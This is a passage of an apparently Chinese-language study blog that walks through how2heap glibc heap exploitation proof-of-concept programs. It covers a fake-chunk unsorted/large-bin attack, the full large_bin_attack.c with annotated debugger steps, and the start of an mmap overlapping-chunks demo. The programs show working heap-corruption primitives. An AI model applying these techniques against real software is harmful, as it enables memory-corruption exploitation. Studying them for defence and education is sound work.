	<span class="token comment">/*
	The address of our fake chunk is set to the unsorted bin 
	chunks 'bk' pointer. 

	This launches the 'unsorted_bin' attack but it is NOT the
	main purpose of us doing this.

	After launching the 'unsorted_bin attack' the 'victim' pointer
	will be set to THIS address. Our goal is to find a way to get
	this address from the allocator.

	Vulnerability!!
	*/</span>
	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>unsorted_bin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">;</span> <span class="token comment">// unsorted_bin->bk</span>

	<span class="token comment">// Only needs to be a valid address. </span>
	<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> large_bin <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk  <span class="token operator">+</span>  <span class="token number">8</span> <span class="token punctuation">;</span>  <span class="token comment">// large_bin->fd</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"of your fake chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Misalign the location in order to use the primitive as a SIZE value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The 'offset' changes depending on if the binary is PIE (5) or not PIE (2)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Vulnerability #2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Overwrite large bins bk->nextsize with the address to put our fake chunk size at."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* 
	This can be seen as a WRITE-WHERE primitive in the large bin.
	However, we are going to write a 'size' for our fake chunk using this. 

	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579
	to an address for our fake size. The write above (bk_nextsize) is
	controlled via the pointer we are going to overwrite below. The
	value that gets written is a heap address; the unsorted bin 
	chunk address above. 

	The 'key' to this is the offset. First, we subtract 0x18 because
	this is the offset to writting to fd_nextsize in the code shown 
	above. Secondly, notice the -2 below. We are going
	to write a 'heap address' at a mis-aligned location and
	use THIS as the size. For instance, if the heap address is 0x123456
	and the pointer is set to 0x60006. This will write the following way:
	- 0x60006: 0x56
	- 0x60007: 0x34
	- 0x60008: 0x12

	Now, our 'fake size' is at 0x60008 and is a valid size for the 
	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk
	from the allocator. 

	Second vulnerability!!!
	*/</span>
	<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> large_bin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> shift_amount<span class="token punctuation">;</span> <span class="token comment">// large_bin->bk_nextsize</span>


	<span class="token comment">/*
	At this point, we've corrupted everything in just the right 
	way so this should work. 

	The purpose of the attack is to have a corrupted 'bk' pointer
	point to ANYWHERE we want and still get the memory back. We do
	this by using the large bin code to write a size to the 'bk' 
	location.

	This call to malloc (if you're lucky), will return a pointer
	to the fake chunk that we created above. 
	*/</span>


	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Make allocation of the size that the value will be written for."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Once the allocation happens, the madness begins"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Once in the unsorted bin, the 'large bin' chunk will be used in orer to "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write a fake 'size' value to the location of our target."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"After this, the target will have a valid size."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size and remove it from the bin."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"With this, we have pulled out an arbitrary chunk!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String before: %s\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String pointer: %p\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>alloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strncpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token string">"\x41\x42\x43\x44\x45\x46\x47"</span><span class="token punctuation">,</span> <span class="token number">0x58</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"String after %s\n"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk ptr: %p\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请两个chunk：</p>
<p>第二个chunk为防止合并</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620210502546.png"></p>
<p>经过一些检查后创建0x4d8的chunk和一个小chunk防止合并&#x3D;&#x3D;》</p>
<p>释放0x4d8的chunk再释放0x4e8的chunk&#x3D;&#x3D;》</p>
<p>再申请0x4e8的chunk，再释放&#x3D;&#x3D;》在unsorted bin中先检查小chunk，不符合&#x3D;&#x3D;》</p>
<p>并入large bin，申请出0x4e8的chunk再释放入unsorted bin中</p>
<p>&#x3D;&#x3D;&#x3D;》覆盖unsorted bin的bk指针为目标地址-0x10</p>
<p>覆盖large bin的bk指针为目标地址-0x8</p>
<p>覆盖large bin的bk_nextsize</p>
<p>&#x3D;&#x3D;&#x3D;》最后malloc即可获得目标地址的chunk</p>
<p><strong>重点：</strong>large bins中的每一个bin中的chunk都是一个范围值</p>
<p>large bin chunk的fd和bk指向前后chunk</p>
<p>fd_nextsize和bk_nextsize指向前后第一个与该chunk大小不同的chunk&#x3D;&#x3D;》便于遍历</p>
<pre class="language-c" data-language="c"><code class="language-c">victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>

<p>&#x3D;&#x3D;》</p>
<p>原布局</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621094238678.png"></p>
<p>经过4条语句入链后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621094208966.png"></p>
<p>最后一条语句将修改target-0x2a-&gt;fd_nextsize&#x3D;&#x3D;》也就是将在target-0xa处写入unsorted的地址&#x3D;&#x3D;》</p>
<p>伪造该地址为合法的size&#x3D;&#x3D;》再调用malloc就可以返回目标地址的chunk了</p>
<h3 id="large-bin-attack-c"><a href="#large-bin-attack-c" class="headerlink" title="large_bin_attack.c"></a>large_bin_attack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;assert.h></span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span>
           <span class="token string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's first look at the targets we want to rewrite on stack:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate the first large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
           <span class="token string">" the first large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Then, we allocate the second large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
           <span class="token string">" the second large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span>
           <span class="token string">" the third large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span>
           <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span>
            <span class="token string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span>
            <span class="token string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span>
            <span class="token string">" [ %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span>
           <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">//------------VULNERABILITY-----------</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span>
            <span class="token string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span>
            <span class="token string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span>
            <span class="token string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//------------------------------------</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span>
            <span class="token string">" During this time, targets should have already been rewritten:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// sanity check</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>stack_var1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>stack_var2 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先定义两个变量，申请chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621095252475.png"></p>
<p>释放p1和p2：进入unsorted bin</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621095352549.png"></p>
<p>申请一个0x90的chunk&#x3D;》从p1中切割：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621095716160.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621095701406.png"></p>
<p>释放p3：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621101825632.png"></p>
<p>修改p2chunk：</p>
<p>未修改前：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621102248881.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621102319534.png"></p>
<p><strong>重点：</strong></p>
<p>在malloc时，首先遍历到p1&#x3D;&#x3D;》</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>

<p>p1属于small bin&#x3D;&#x3D;》__int_malloc继续遍历p3&#x3D;&#x3D;》</p>
<p>victim为p3，fwd为p2</p>
<pre class="language-c" data-language="c"><code class="language-c">victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span></code></pre>

<p>&#x3D;&#x3D;&#x3D;&#x3D;》在链入p1的第四个语句bck-&gt;fd &#x3D; victim;将会把stack_var1修改为p3的地址</p>
<p>实现过程：</p>
<p>布局：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621165910192.png"></p>
<p>并入：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621170223561.png"></p>
<p>成功实现修改stack_var2为p3地址</p>
<p>在之后执行了 bck-&gt;fd &#x3D; victim;实现将stack_var1的值修改为p3</p>
<h3 id="mmap-overlapping-chunks-c"><a href="#mmap-overlapping-chunks-c" class="headerlink" title="mmap_overlapping_chunks.c"></a>mmap_overlapping_chunks.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token comment">/*
Technique should work on all versions of GLibC
Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`

POC written by POC written by Maxwell Dulin (Strikeout) 
*/</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token comment">/*
	A primer on Mmap chunks in GLibC
	==================================
	In GLibC, there is a point where an allocation is so large that malloc
	decides that we need a seperate section of memory for it, instead 
	of allocating it on the normal heap. This is determined by the mmap_threshold var.
	Instead of the normal logic for getting a chunk, the system call *Mmap* is 
	used. This allocates a section of virtual memory and gives it back to the user. 

	Similarly, the freeing process is going to be different. Instead 
	of a free chunk being given back to a bin or to the rest of the heap,
	another syscall is used: *Munmap*. This takes in a pointer of a previously 
	allocated Mmap chunk and releases it back to the kernel. 

	Mmap chunks have special bit set on the size metadata: the second bit. If this 
	bit is set, then the chunk was allocated as an Mmap chunk. 

	Mmap chunks have a prev_size and a size. The *size* represents the current 
	size of the chunk. The *prev_size* of a chunk represents the left over space
	from the size of the Mmap chunk (not the chunks directly belows size). 
	However, the fd and bk pointers are not used, as Mmap chunks do not go back 
	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of 
	the chunk must be page-aligned.

	The POC below is essentially an overlapping chunk attack but on mmap chunks. 
	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. 
	The main difference is that mmapped chunks have special properties and are 
	handled in different ways, creating different attack scenarios than normal 
	overlapping chunk attacks. There are other things that can be done, 
	such as munmapping system libraries, the heap itself and other things.
	This is meant to be a simple proof of concept to demonstrate the general 
	way to perform an attack on an mmap chunk.

	For more information on mmap chunks in GLibC, read this post: 
	http://tukan.farm/2016/07/27/munmap-madness/
	*/</span>

	<span class="token keyword">int</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Extremely large chunks are special because they are allocated in their own mmaped section\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"of memory, instead of being put onto the normal heap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"=======================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating three extremely large heap chunks of size 0x100000 \n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> top_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The first mmap chunk goes directly above LibC: %p\n"</span><span class="token punctuation">,</span>top_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// After this, all chunks are allocated downwards in memory towards the heap.</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The second mmap chunk goes below LibC: %p\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> mmap_chunk_3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The third mmap chunk goes below the second mmap chunk: %p\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCurrent System Memory Layout \n"</span> \
<span class="token string">"================================================\n"</span> \
<span class="token string">"running program\n"</span> \
<span class="token string">"heap\n"</span> \
<span class="token string">"....\n"</span> \
<span class="token string">"third mmap chunk\n"</span> \
<span class="token string">"second mmap chunk\n"</span> \
<span class="token string">"LibC\n"</span> \
<span class="token string">"....\n"</span> \
<span class="token string">"ld\n"</span> \
<span class="token string">"first mmap chunk\n"</span>
<span class="token string">"===============================================\n\n"</span> \
<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Prev Size of third mmap chunk: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size of third mmap chunk: 0x%llx\n\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

